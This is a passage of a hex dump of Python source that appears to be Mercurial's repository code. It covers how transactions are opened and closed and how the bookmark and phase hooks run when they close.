+00015eb0: 2020 2020 2020 2023 206f 7468 6572 2066         # other f
+00015ec0: 616d 696c 6965 7320 6f66 2063 6861 6e67  amilies of chang
+00015ed0: 6573 2028 626f 6f6b 6d61 726b 732c 2070  es (bookmarks, p
+00015ee0: 6861 7365 732c 206f 6273 6f6c 6573 6365  hases, obsolesce
+00015ef0: 6e63 6529 2e0a 2020 2020 2020 2020 2020  nce)..          
+00015f00: 2020 230a 2020 2020 2020 2020 2020 2020    #.            
+00015f10: 2320 5468 6973 2077 696c 6c20 6861 7665  # This will have
+00015f20: 2074 6f20 6265 2066 6978 6564 2062 6566   to be fixed bef
+00015f30: 6f72 6520 7765 2072 656d 6f76 6520 7468  ore we remove th
+00015f40: 6520 6578 7065 7269 6d65 6e74 616c 0a20  e experimental. 
+00015f50: 2020 2020 2020 2020 2020 2023 2067 6174             # gat
+00015f60: 696e 672e 0a20 2020 2020 2020 2020 2020  ing..           
+00015f70: 2074 7261 636b 7461 6773 2874 7232 290a   tracktags(tr2).
+00015f80: 2020 2020 2020 2020 2020 2020 7265 706f              repo
+00015f90: 203d 2072 6570 6f72 6566 2829 0a20 2020   = reporef().   
+00015fa0: 2020 2020 2020 2020 2061 7373 6572 7420           assert 
+00015fb0: 7265 706f 2069 7320 6e6f 7420 4e6f 6e65  repo is not None
+00015fc0: 2020 2320 6865 6c70 2070 7974 7970 650a    # help pytype.
+00015fd0: 0a20 2020 2020 2020 2020 2020 2073 696e  .            sin
+00015fe0: 676c 6568 6561 646f 7074 203d 2028 6227  gleheadopt = (b'
+00015ff0: 6578 7065 7269 6d65 6e74 616c 272c 2062  experimental', b
+00016000: 2773 696e 676c 652d 6865 6164 2d70 6572  'single-head-per
+00016010: 2d62 7261 6e63 6827 290a 2020 2020 2020  -branch').      
+00016020: 2020 2020 2020 7369 6e67 6c65 6865 6164        singlehead
+00016030: 203d 2072 6570 6f2e 7569 2e63 6f6e 6669   = repo.ui.confi
+00016040: 6762 6f6f 6c28 2a73 696e 676c 6568 6561  gbool(*singlehea
+00016050: 646f 7074 290a 2020 2020 2020 2020 2020  dopt).          
+00016060: 2020 6966 2073 696e 676c 6568 6561 643a    if singlehead:
+00016070: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00016080: 2073 696e 676c 6568 6561 6473 7562 203d   singleheadsub =
+00016090: 2072 6570 6f2e 7569 2e63 6f6e 6669 6773   repo.ui.configs
+000160a0: 7562 6f70 7469 6f6e 7328 2a73 696e 676c  uboptions(*singl
+000160b0: 6568 6561 646f 7074 295b 315d 0a20 2020  eheadopt)[1].   
+000160c0: 2020 2020 2020 2020 2020 2020 2061 6363               acc
+000160d0: 6f75 6e74 636c 6f73 6564 203d 2073 696e  ountclosed = sin
+000160e0: 676c 6568 6561 6473 7562 2e67 6574 280a  gleheadsub.get(.
+000160f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00016100: 2020 2020 6222 6163 636f 756e 742d 636c      b"account-cl
+00016110: 6f73 6564 2d68 6561 6473 222c 2046 616c  osed-heads", Fal
+00016120: 7365 0a20 2020 2020 2020 2020 2020 2020  se.             
+00016130: 2020 2029 0a20 2020 2020 2020 2020 2020     ).           
+00016140: 2020 2020 2069 6620 7369 6e67 6c65 6865       if singlehe
+00016150: 6164 7375 622e 6765 7428 6222 7075 626c  adsub.get(b"publ
+00016160: 6963 2d63 6861 6e67 6573 2d6f 6e6c 7922  ic-changes-only"
+00016170: 2c20 4661 6c73 6529 3a0a 2020 2020 2020  , False):.      
+00016180: 2020 2020 2020 2020 2020 2020 2020 6669                fi
+00016190: 6c74 6572 6e61 6d65 203d 2062 2269 6d6d  ltername = b"imm
+000161a0: 7574 6162 6c65 220a 2020 2020 2020 2020  utable".        
+000161b0: 2020 2020 2020 2020 656c 7365 3a0a 2020          else:.  
+000161c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000161d0: 2020 6669 6c74 6572 6e61 6d65 203d 2062    filtername = b
+000161e0: 2276 6973 6962 6c65 220a 2020 2020 2020  "visible".      
+000161f0: 2020 2020 2020 2020 2020 7363 6d75 7469            scmuti
+00016200: 6c2e 656e 666f 7263 6573 696e 676c 6568  l.enforcesingleh
+00016210: 6561 6428 0a20 2020 2020 2020 2020 2020  ead(.           
+00016220: 2020 2020 2020 2020 2072 6570 6f2c 2074           repo, t
+00016230: 7232 2c20 6465 7363 2c20 6163 636f 756e  r2, desc, accoun
+00016240: 7463 6c6f 7365 642c 2066 696c 7465 726e  tclosed, filtern
+00016250: 616d 650a 2020 2020 2020 2020 2020 2020  ame.            
+00016260: 2020 2020 290a 2020 2020 2020 2020 2020      ).          
+00016270: 2020 6966 2068 6f6f 6b2e 6861 7368 6f6f    if hook.hashoo
+00016280: 6b28 7265 706f 2e75 692c 2062 2770 7265  k(repo.ui, b'pre
+00016290: 7478 6e63 6c6f 7365 2d62 6f6f 6b6d 6172  txnclose-bookmar
+000162a0: 6b27 293a 0a20 2020 2020 2020 2020 2020  k'):.           
+000162b0: 2020 2020 2066 6f72 206e 616d 652c 2028       for name, (
+000162c0: 6f6c 642c 206e 6577 2920 696e 2073 6f72  old, new) in sor
+000162d0: 7465 6428 0a20 2020 2020 2020 2020 2020  ted(.           
+000162e0: 2020 2020 2020 2020 2074 722e 6368 616e           tr.chan
+000162f0: 6765 735b 6227 626f 6f6b 6d61 726b 7327  ges[b'bookmarks'
+00016300: 5d2e 6974 656d 7328 290a 2020 2020 2020  ].items().      
+00016310: 2020 2020 2020 2020 2020 293a 0a20 2020            ):.   
+00016320: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00016330: 2061 7267 7320 3d20 7472 2e68 6f6f 6b61   args = tr.hooka
+00016340: 7267 732e 636f 7079 2829 0a20 2020 2020  rgs.copy().     
+00016350: 2020 2020 2020 2020 2020 2020 2020 2061                 a
+00016360: 7267 732e 7570 6461 7465 2862 6f6f 6b6d  rgs.update(bookm
+00016370: 6172 6b73 2e70 7265 7061 7265 686f 6f6b  arks.preparehook
+00016380: 6172 6773 286e 616d 652c 206f 6c64 2c20  args(name, old, 
+00016390: 6e65 7729 290a 2020 2020 2020 2020 2020  new)).          
+000163a0: 2020 2020 2020 2020 2020 7265 706f 2e68            repo.h
+000163b0: 6f6f 6b28 0a20 2020 2020 2020 2020 2020  ook(.           
+000163c0: 2020 2020 2020 2020 2020 2020 2062 2770               b'p
+000163d0: 7265 7478 6e63 6c6f 7365 2d62 6f6f 6b6d  retxnclose-bookm
+000163e0: 6172 6b27 2c0a 2020 2020 2020 2020 2020  ark',.          
+000163f0: 2020 2020 2020 2020 2020 2020 2020 7468                th
+00016400: 726f 773d 5472 7565 2c0a 2020 2020 2020  row=True,.      
+00016410: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00016420: 2020 2a2a 7079 636f 6d70 6174 2e73 7472    **pycompat.str
+00016430: 6b77 6172 6773 2861 7267 7329 0a20 2020  kwargs(args).   
+00016440: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00016450: 2029 0a20 2020 2020 2020 2020 2020 2069   ).            i
+00016460: 6620 686f 6f6b 2e68 6173 686f 6f6b 2872  f hook.hashook(r
+00016470: 6570 6f2e 7569 2c20 6227 7072 6574 786e  epo.ui, b'pretxn
+00016480: 636c 6f73 652d 7068 6173 6527 293a 0a20  close-phase'):. 
+00016490: 2020 2020 2020 2020 2020 2020 2020 2063                 c
+000164a0: 6c20 3d20 7265 706f 2e75 6e66 696c 7465  l = repo.unfilte
+000164b0: 7265 6428 292e 6368 616e 6765 6c6f 670a  red().changelog.
+000164c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000164d0: 666f 7220 7265 7673 2c20 286f 6c64 2c20  for revs, (old, 
+000164e0: 6e65 7729 2069 6e20 7472 2e63 6861 6e67  new) in tr.chang
+000164f0: 6573 5b62 2770 6861 7365 7327 5d3a 0a20  es[b'phases']:. 
+00016500: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00016510: 2020 2066 6f72 2072 6576 2069 6e20 7265     for rev in re
+00016520: 7673 3a0a 2020 2020 2020 2020 2020 2020  vs:.            
+00016530: 2020 2020 2020 2020 2020 2020 6172 6773              args
+00016540: 203d 2074 722e 686f 6f6b 6172 6773 2e63   = tr.hookargs.c
+00016550: 6f70 7928 290a 2020 2020 2020 2020 2020  opy().          
+00016560: 2020 2020 2020 2020 2020 2020 2020 6e6f                no
+00016570: 6465 203d 2068 6578 2863 6c2e 6e6f 6465  de = hex(cl.node
+00016580: 2872 6576 2929 0a20 2020 2020 2020 2020  (rev)).         
+00016590: 2020 2020 2020 2020 2020 2020 2020 2061                 a
+000165a0: 7267 732e 7570 6461 7465 2870 6861 7365  rgs.update(phase
+000165b0: 732e 7072 6570 6172 6568 6f6f 6b61 7267  s.preparehookarg
+000165c0: 7328 6e6f 6465 2c20 6f6c 642c 206e 6577  s(node, old, new
+000165d0: 2929 0a20 2020 2020 2020 2020 2020 2020  )).             
+000165e0: 2020 2020 2020 2020 2020 2072 6570 6f2e             repo.
+000165f0: 686f 6f6b 280a 2020 2020 2020 2020 2020  hook(.          
+00016600: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00016610: 2020 6227 7072 6574 786e 636c 6f73 652d    b'pretxnclose-
+00016620: 7068 6173 6527 2c0a 2020 2020 2020 2020  phase',.        
+00016630: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00016640: 2020 2020 7468 726f 773d 5472 7565 2c0a      throw=True,.
+00016650: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00016660: 2020 2020 2020 2020 2020 2020 2a2a 7079              **py
+00016670: 636f 6d70 6174 2e73 7472 6b77 6172 6773  compat.strkwargs
+00016680: 2861 7267 7329 0a20 2020 2020 2020 2020  (args).         
+00016690: 2020 2020 2020 2020 2020 2020 2020 2029                 )
+000166a0: 0a0a 2020 2020 2020 2020 2020 2020 7265  ..            re
+000166b0: 706f 2e68 6f6f 6b28 0a20 2020 2020 2020  po.hook(.       
+000166c0: 2020 2020 2020 2020 2062 2770 7265 7478           b'pretx
+000166d0: 6e63 6c6f 7365 272c 2074 6872 6f77 3d54  nclose', throw=T
+000166e0: 7275 652c 202a 2a70 7963 6f6d 7061 742e  rue, **pycompat.
+000166f0: 7374 726b 7761 7267 7328 7472 2e68 6f6f  strkwargs(tr.hoo
+00016700: 6b61 7267 7329 0a20 2020 2020 2020 2020  kargs).         
+00016710: 2020 2029 0a0a 2020 2020 2020 2020 6465     )..        de
+00016720: 6620 7265 6c65 6173 6566 6e28 7472 2c20  f releasefn(tr, 
+00016730: 7375 6363 6573 7329 3a0a 2020 2020 2020  success):.      
+00016740: 2020 2020 2020 7265 706f 203d 2072 6570        repo = rep
+00016750: 6f72 6566 2829 0a20 2020 2020 2020 2020  oref().         
+00016760: 2020 2069 6620 7265 706f 2069 7320 4e6f     if repo is No
+00016770: 6e65 3a0a 2020 2020 2020 2020 2020 2020  ne:.            
+00016780: 2020 2020 2320 4966 2074 6865 2072 6570      # If the rep
+00016790: 6f20 6861 7320 6265 656e 2047 4327 6420  o has been GC'd 
+000167a0: 2861 6e64 2074 6869 7320 7265 6c65 6173  (and this releas
+000167b0: 6520 6675 6e63 7469 6f6e 2069 7320 6265  e function is be
+000167c0: 696e 670a 2020 2020 2020 2020 2020 2020  ing.            
+000167d0: 2020 2020 2320 6361 6c6c 6564 2066 726f      # called fro
+000167e0: 6d20 7472 616e 7361 6374 696f 6e2e 5f5f  m transaction.__
+000167f0: 6465 6c5f 5f29 2c20 7468 6572 6527 7320  del__), there's 
+00016800: 6e6f 7420 6d75 6368 2077 6520 6361 6e20  not much we can 
+00016810: 646f 2c0a 2020 2020 2020 2020 2020 2020  do,.            
+00016820: 2020 2020 2320 736f 206a 7573 7420 6c65      # so just le
+00016830: 6176 6520 7468 6520 756e 6669 6e69 7368  ave the unfinish
+00016840: 6564 2074 7261 6e73 6163 7469 6f6e 2074  ed transaction t
+00016850: 6865 7265 2061 6e64 206c 6574 2074 6865  here and let the
+00016860: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00016870: 2023 2075 7365 7220 7275 6e20 6068 6720   # user run `hg 
+00016880: 7265 636f 7665 7260 2e0a 2020 2020 2020  recover`..      
+00016890: 2020 2020 2020 2020 2020 7265 7475 726e            return
+000168a0: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
+000168b0: 7375 6363 6573 733a 0a20 2020 2020 2020  success:.       
+000168c0: 2020 2020 2020 2020 2023 2074 6869 7320           # this 
+000168d0: 7368 6f75 6c64 2062 6520 6578 706c 6963  should be explic
+000168e0: 6974 6c79 2069 6e76 6f6b 6564 2068 6572  itly invoked her
+000168f0: 652c 2062 6563 6175 7365 0a20 2020 2020  e, because.     
+00016900: 2020 2020 2020 2020 2020 2023 2069 6e2d             # in-
+00016910: 6d65 6d6f 7279 2063 6861 6e67 6573 2061  memory changes a
+00016920: 7265 6e27 7420 7772 6974 7465 6e20 6f75  ren't written ou
+00016930: 7420 6174 2063 6c6f 7369 6e67 0a20 2020  t at closing.   
+00016940: 2020 2020 2020 2020 2020 2020 2023 2074               # t
+00016950: 7261 6e73 6163 7469 6f6e 2c20 6966 2074  ransaction, if t
+00016960: 722e 6164 6466 696c 6567 656e 6572 6174  r.addfilegenerat
+00016970: 6f72 2028 7669 610a 2020 2020 2020 2020  or (via.        
+00016980: 2020 2020 2020 2020 2320 6469 7273 7461          # dirsta
+00016990: 7465 2e77 7269 7465 206f 7220 736f 2920  te.write or so) 
+000169a0: 6973 6e27 7420 696e 766f 6b65 6420 7768  isn't invoked wh
+000169b0: 696c 650a 2020 2020 2020 2020 2020 2020  ile.            
+000169c0: 2020 2020 2320 7472 616e 7361 6374 696f      # transactio
+000169d0: 6e20 7275 6e6e 696e 670a 2020 2020 2020  n running.      
+000169e0: 2020 2020 2020 2020 2020 7265 706f 2e64            repo.d
+000169f0: 6972 7374 6174 652e 7772 6974 6528 4e6f  irstate.write(No
+00016a00: 6e65 290a 2020 2020 2020 2020 2020 2020  ne).            
+00016a10: 656c 7365 3a0a 2020 2020 2020 2020 2020  else:.          
+00016a20: 2020 2020 2020 2320 6469 7363 6172 6420        # discard 
+00016a30: 616c 6c20 6368 616e 6765 7320 2869 6e63  all changes (inc
+00016a40: 6c75 6469 6e67 206f 6e65 7320 616c 7265  luding ones alre
+00016a50: 6164 7920 7772 6974 7465 6e0a 2020 2020  ady written.    
+00016a60: 2020 2020 2020 2020 2020 2020 2320 6f75              # ou
+00016a70: 7429 2069 6e20 7468 6973 2074 7261 6e73  t) in this trans
+00016a80: 6163 7469 6f6e 0a20 2020 2020 2020 2020  action.         
+00016a90: 2020 2020 2020 2072 6570 6f2e 696e 7661         repo.inva
+00016aa0: 6c69 6461 7465 2863 6c65 6172 6669 6c65  lidate(clearfile
+00016ab0: 6361 6368 653d 5472 7565 290a 0a20 2020  cache=True)..   
+00016ac0: 2020 2020 2074 7220 3d20 7472 616e 7361       tr = transa
+00016ad0: 6374 696f 6e2e 7472 616e 7361 6374 696f  ction.transactio
+00016ae0: 6e28 0a20 2020 2020 2020 2020 2020 2072  n(.            r
+00016af0: 702c 0a20 2020 2020 2020 2020 2020 2073  p,.            s
+00016b00: 656c 662e 7376 6673 2c0a 2020 2020 2020  elf.svfs,.      
+00016b10: 2020 2020 2020 7666 736d 6170 2c0a 2020        vfsmap,.  
+00016b20: 2020 2020 2020 2020 2020 6222 6a6f 7572            b"jour
+00016b30: 6e61 6c22 2c0a 2020 2020 2020 2020 2020  nal",.          
+00016b40: 2020 6222 756e 646f 222c 0a20 2020 2020    b"undo",.     
+00016b50: 2020 2020 2020 2061 6674 6572 7472 616e         aftertran
+00016b60: 7328 7265 6e61 6d65 7329 2c0a 2020 2020  s(renames),.    
+00016b70: 2020 2020 2020 2020 7365 6c66 2e73 746f          self.sto
+00016b80: 7265 2e63 7265 6174 656d 6f64 652c 0a20  re.createmode,. 
+00016b90: 2020 2020 2020 2020 2020 2076 616c 6964             valid
+00016ba0: 6174 6f72 3d76 616c 6964 6174 652c 0a20  ator=validate,. 
+00016bb0: 2020 2020 2020 2020 2020 2072 656c 6561             relea
+00016bc0: 7365 666e 3d72 656c 6561 7365 666e 2c0a  sefn=releasefn,.
+00016bd0: 2020 2020 2020 2020 2020 2020 6368 6563              chec
+00016be0: 6b61 6d62 6967 6669 6c65 733d 5f63 6163  kambigfiles=_cac
+00016bf0: 6865 6466 696c 6573 2c0a 2020 2020 2020  hedfiles,.      
+00016c00: 2020 2020 2020 6e61 6d65 3d64 6573 632c        name=desc,
+00016c10: 0a20 2020 2020 2020 2029 0a20 2020 2020  .        ).     
+00016c20: 2020 2074 722e 6368 616e 6765 735b 6227     tr.changes[b'
+00016c30: 6f72 6967 7265 706f 6c65 6e27 5d20 3d20  origrepolen'] = 
+00016c40: 6c65 6e28 7365 6c66 290a 2020 2020 2020  len(self).      
+00016c50: 2020 7472 2e63 6861 6e67 6573 5b62 276f    tr.changes[b'o
+00016c60: 6273 6d61 726b 6572 7327 5d20 3d20 7365  bsmarkers'] = se
+00016c70: 7428 290a 2020 2020 2020 2020 7472 2e63  t().        tr.c
+00016c80: 6861 6e67 6573 5b62 2770 6861 7365 7327  hanges[b'phases'
+00016c90: 5d20 3d20 5b5d 0a20 2020 2020 2020 2074  ] = [].        t
+00016ca0: 722e 6368 616e 6765 735b 6227 626f 6f6b  r.changes[b'book
+00016cb0: 6d61 726b 7327 5d20 3d20 7b7d 0a0a 2020  marks'] = {}..  
+00016cc0: 2020 2020 2020 7472 2e68 6f6f 6b61 7267        tr.hookarg
+00016cd0: 735b 6227 7478 6e69 6427 5d20 3d20 7478  s[b'txnid'] = tx
+00016ce0: 6e69 640a 2020 2020 2020 2020 7472 2e68  nid.        tr.h
+00016cf0: 6f6f 6b61 7267 735b 6227 7478 6e6e 616d  ookargs[b'txnnam
+00016d00: 6527 5d20 3d20 6465 7363 0a20 2020 2020  e'] = desc.     
+00016d10: 2020 2074 722e 686f 6f6b 6172 6773 5b62     tr.hookargs[b
+00016d20: 2763 6861 6e67 6573 275d 203d 2074 722e  'changes'] = tr.
+00016d30: 6368 616e 6765 730a 2020 2020 2020 2020  changes.        
+00016d40: 2320 6e6f 7465 3a20 7772 6974 696e 6720  # note: writing 
+00016d50: 7468 6520 666e 6361 6368 6520 6f6e 6c79  the fncache only
+00016d60: 2064 7572 696e 6720 6669 6e61 6c69 7a65   during finalize
+00016d70: 206d 6561 6e20 7468 6174 2074 6865 2066   mean that the f
+00016d80: 696c 6520 6973 0a20 2020 2020 2020 2023  ile is.        #
+00016d90: 206f 7574 6461 7465 6420 7768 656e 2072   outdated when r
+00016da0: 756e 6e69 6e67 2068 6f6f 6b73 2e20 4173  unning hooks. As
+00016db0: 2066 6e63 6163 6865 2069 7320 7573 6564   fncache is used
+00016dc0: 2066 6f72 2073 7472 6561 6d69 6e67 2063   for streaming c
+00016dd0: 6c6f 6e65 2c0a 2020 2020 2020 2020 2320  lone,.        # 
+00016de0: 7468 6973 2069 7320 6e6f 7420 6578 7065  this is not expe
+00016df0: 6374 6564 2074 6f20 6272 6561 6b20 616e  cted to break an
+00016e00: 7974 6869 6e67 2074 6861 7420 6861 7070  ything that happ
+00016e10: 656e 2064 7572 696e 6720 7468 6520 686f  en during the ho
+00016e20: 6f6b 732e 0a20 2020 2020 2020 2074 722e  oks..        tr.
+00016e30: 6164 6466 696e 616c 697a 6528 6227 666c  addfinalize(b'fl
+00016e40: 7573 682d 666e 6361 6368 6527 2c20 7365  ush-fncache', se
+00016e50: 6c66 2e73 746f 7265 2e77 7269 7465 290a  lf.store.write).
+00016e60: 0a20 2020 2020 2020 2064 6566 2074 786e  .        def txn
+00016e70: 636c 6f73 6568 6f6f 6b28 7472 3229 3a0a  closehook(tr2):.
+00016e80: 2020 2020 2020 2020 2020 2020 2222 2254              """T
+00016e90: 6f20 6265 2072 756e 2069 6620 7472 616e  o be run if tran
+00016ea0: 7361 6374 696f 6e20 6973 2073 7563 6365  saction is succe
+00016eb0: 7373 6675 6c2c 2077 696c 6c20 7363 6865  ssful, will sche
+00016ec0: 6475 6c65 2061 2068 6f6f 6b20 7275 6e22  dule a hook run"
+00016ed0: 2222 0a20 2020 2020 2020 2020 2020 2023  "".            #
+00016ee0: 2044 6f6e 2774 2072 6566 6572 656e 6365   Don't reference
+00016ef0: 2074 7232 2069 6e20 686f 6f6b 2829 2073   tr2 in hook() s
+00016f00: 6f20 7765 2064 6f6e 2774 2068 6f6c 6420  o we don't hold 
+00016f10: 6120 7265 6665 7265 6e63 652e 0a20 2020  a reference..   
+00016f20: 2020 2020 2020 2020 2023 2054 6869 7320           # This 
+00016f30: 7265 6475 6365 7320 6d65 6d6f 7279 2063  reduces memory c
+00016f40: 6f6e 7375 6d70 7469 6f6e 2077 6865 6e20  onsumption when 
+00016f50: 7468 6572 6520 6172 6520 6d75 6c74 6970  there are multip
+00016f60: 6c65 0a20 2020 2020 2020 2020 2020 2023  le.            #
+00016f70: 2074 7261 6e73 6163 7469 6f6e 7320 7065   transactions pe
+00016f80: 7220 6c6f 636b 2e20 5468 6973 2063 616e  r lock. This can
+00016f90: 206c 696b 656c 7920 676f 2061 7761 7920   likely go away 
+00016fa0: 6966 2069 7373 7565 3530 3435 0a20 2020  if issue5045.   
+00016fb0: 2020 2020 2020 2020 2023 2066 6978 6573           # fixes
+00016fc0: 2074 6865 2066 756e 6374 696f 6e20 6163   the function ac
+00016fd0: 6375 6d75 6c61 7469 6f6e 2e0a 2020 2020  cumulation..    
+00016fe0: 2020 2020 2020 2020 686f 6f6b 6172 6773          hookargs
+00016ff0: 203d 2074 7232 2e68 6f6f 6b61 7267 730a   = tr2.hookargs.
+00017000: 0a20 2020 2020 2020 2020 2020 2064 6566  .            def
+00017010: 2068 6f6f 6b66 756e 6328 756e 7573 6564   hookfunc(unused
+00017020: 5f73 7563 6365 7373 293a 0a20 2020 2020  _success):.     
+00017030: 2020 2020 2020 2020 2020 2072 6570 6f20             repo 
+00017040: 3d20 7265 706f 7265 6628 290a 2020 2020  = reporef().    
+00017050: 2020 2020 2020 2020 2020 2020 6173 7365              asse
+00017060: 7274 2072 6570 6f20 6973 206e 6f74 204e  rt repo is not N
+00017070: 6f6e 6520 2023 2068 656c 7020 7079 7479  one  # help pyty
+00017080: 7065 0a0a 2020 2020 2020 2020 2020 2020  pe..            
+00017090: 2020 2020 6966 2068 6f6f 6b2e 6861 7368      if hook.hash
+000170a0: 6f6f 6b28 7265 706f 2e75 692c 2062 2774  ook(repo.ui, b't
+000170b0: 786e 636c 6f73 652d 626f 6f6b 6d61 726b  xnclose-bookmark
+000170c0: 2729 3a0a 2020 2020 2020 2020 2020 2020  '):.            
+000170d0: 2020 2020 2020 2020 626d 6368 616e 6765          bmchange
+000170e0: 7320 3d20 736f 7274 6564 2874 722e 6368  s = sorted(tr.ch
+000170f0: 616e 6765 735b 6227 626f 6f6b 6d61 726b  anges[b'bookmark
+00017100: 7327 5d2e 6974 656d 7328 2929 0a20 2020  s'].items()).   
+00017110: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017120: 2066 6f72 206e 616d 652c 2028 6f6c 642c   for name, (old,
+00017130: 206e 6577 2920 696e 2062 6d63 6861 6e67   new) in bmchang
+00017140: 6573 3a0a 2020 2020 2020 2020 2020 2020  es:.            
+00017150: 2020 2020 2020 2020 2020 2020 6172 6773              args
+00017160: 203d 2074 722e 686f 6f6b 6172 6773 2e63   = tr.hookargs.c
+00017170: 6f70 7928 290a 2020 2020 2020 2020 2020  opy().          
+00017180: 2020 2020 2020 2020 2020 2020 2020 6172                ar
+00017190: 6773 2e75 7064 6174 6528 626f 6f6b 6d61  gs.update(bookma
+000171a0: 726b 732e 7072 6570 6172 6568 6f6f 6b61  rks.preparehooka
+000171b0: 7267 7328 6e61 6d65 2c20 6f6c 642c 206e  rgs(name, old, n
+000171c0: 6577 2929 0a20 2020 2020 2020 2020 2020  ew)).           
+000171d0: 2020 2020 2020 2020 2020 2020 2072 6570               rep
+000171e0: 6f2e 686f 6f6b 280a 2020 2020 2020 2020  o.hook(.        
+000171f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017200: 2020 2020 6227 7478 6e63 6c6f 7365 2d62      b'txnclose-b
+00017210: 6f6f 6b6d 6172 6b27 2c0a 2020 2020 2020  ookmark',.      
+00017220: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017230: 2020 2020 2020 7468 726f 773d 4661 6c73        throw=Fals
+00017240: 652c 0a20 2020 2020 2020 2020 2020 2020  e,.             
+00017250: 2020 2020 2020 2020 2020 2020 2020 202a                 *
+00017260: 2a70 7963 6f6d 7061 742e 7374 726b 7761  *pycompat.strkwa
+00017270: 7267 7328 6172 6773 290a 2020 2020 2020  rgs(args).      
+00017280: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017290: 2020 290a 0a20 2020 2020 2020 2020 2020    )..           
+000172a0: 2020 2020 2069 6620 686f 6f6b 2e68 6173       if hook.has
+000172b0: 686f 6f6b 2872 6570 6f2e 7569 2c20 6227  hook(repo.ui, b'
+000172c0: 7478 6e63 6c6f 7365 2d70 6861 7365 2729  txnclose-phase')
+000172d0: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+000172e0: 2020 2020 2020 636c 203d 2072 6570 6f2e        cl = repo.
+000172f0: 756e 6669 6c74 6572 6564 2829 2e63 6861  unfiltered().cha
+00017300: 6e67 656c 6f67 0a20 2020 2020 2020 2020  ngelog.         
+00017310: 2020 2020 2020 2020 2020 2070 6861 7365             phase
+00017320: 6d76 203d 2073 6f72 7465 6428 0a20 2020  mv = sorted(.   
+00017330: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017340: 2020 2020 2074 722e 6368 616e 6765 735b       tr.changes[
+00017350: 6227 7068 6173 6573 275d 2c20 6b65 793d  b'phases'], key=
+00017360: 6c61 6d62 6461 2072 3a20 725b 305d 5b30  lambda r: r[0][0
+00017370: 5d0a 2020 2020 2020 2020 2020 2020 2020  ].              
+00017380: 2020 2020 2020 290a 2020 2020 2020 2020        ).        
+00017390: 2020 2020 2020 2020 2020 2020 666f 7220              for 
+000173a0: 7265 7673 2c20 286f 6c64 2c20 6e65 7729  revs, (old, new)
+000173b0: 2069 6e20 7068 6173 656d 763a 0a20 2020   in phasemv:.   
+000173c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000173d0: 2020 2020 2066 6f72 2072 6576 2069 6e20       for rev in 
+000173e0: 7265 7673 3a0a 2020 2020 2020 2020 2020  revs:.          
+000173f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017400: 2020 6172 6773 203d 2074 722e 686f 6f6b    args = tr.hook
+00017410: 6172 6773 2e63 6f70 7928 290a 2020 2020  args.copy().    
+00017420: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017430: 2020 2020 2020 2020 6e6f 6465 203d 2068          node = h
+00017440: 6578 2863 6c2e 6e6f 6465 2872 6576 2929  ex(cl.node(rev))
+00017450: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00017460: 2020 2020 2020 2020 2020 2020 2061 7267               arg
+00017470: 732e 7570 6461 7465 2870 6861 7365 732e  s.update(phases.
+00017480: 7072 6570 6172 6568 6f6f 6b61 7267 7328  preparehookargs(
+00017490: 6e6f 6465 2c20 6f6c 642c 206e 6577 2929  node, old, new))
+000174a0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+000174b0: 2020 2020 2020 2020 2020 2020 2072 6570               rep
+000174c0: 6f2e 686f 6f6b 280a 2020 2020 2020 2020  o.hook(.        
+000174d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000174e0: 2020 2020 2020 2020 6227 7478 6e63 6c6f          b'txnclo
+000174f0: 7365 2d70 6861 7365 272c 0a20 2020 2020  se-phase',.     
+00017500: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017510: 2020 2020 2020 2020 2020 2074 6872 6f77             throw
+00017520: 3d46 616c 7365 2c0a 2020 2020 2020 2020  =False,.        
+00017530: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00017540: 2020 2020 2020 2020 2a2a 7079 636f 6d70          **pycomp
+00017550: 6174 2e73 7472 6b77 6172 6773 2861 7267  at.strkwargs(arg
+00017560: 7329 0a20 2020 2020 2020 2020 2020 2020  s).             
+00017570: 2020 2020 2020 2020 2020 2020 2020 2029                 )
+00017580: 0a0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00017590: 2020 7265 706f 2e68 6f6f 6b28 0a20 2020    repo.hook(.   
+000175a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000175b0: 2062 2774 786e 636c 6f73 6527 2c20 7468   b'txnclose', th
+000175c0: 726f 773d 4661 6c73 652c 202a 2a70 7963  row=False, **pyc
+000175d0: 6f6d 7061 742e 7374 726b 7761 7267 7328  ompat.strkwargs(
+000175e0: 686f 6f6b 6172 6773 290a 2020 2020 2020  hookargs).      
+000175f0: 2020 2020 2020 2020 2020 290a 0a20 2020            )..   
+00017600: 2020 2020 2020 2020 2072 6570 6f20 3d20           repo = 
+00017610: 7265 706f 7265 6628 290a 2020 2020 2020  reporef().      
+00017620: 2020 2020 2020 6173 7365 7274 2072 6570        assert rep
+00017630: 6f20 6973 206e 6f74 204e 6f6e 6520 2023  o is not None  #
+00017640: 2068 656c 7020 7079 7479 7065 0a20 2020   help pytype.   
+00017650: 2020 2020 2020 2020 2072 6570 6f2e 5f61           repo._a
+00017660: 6674 6572 6c6f 636b 2868 6f6f 6b66 756e  fterlock(hookfun
+00017670: 6329 0a0a 2020 2020 2020 2020 7472 2e61  c)..        tr.a
+00017680: 6464 6669 6e61 6c69 7a65 2862 2774 786e  ddfinalize(b'txn
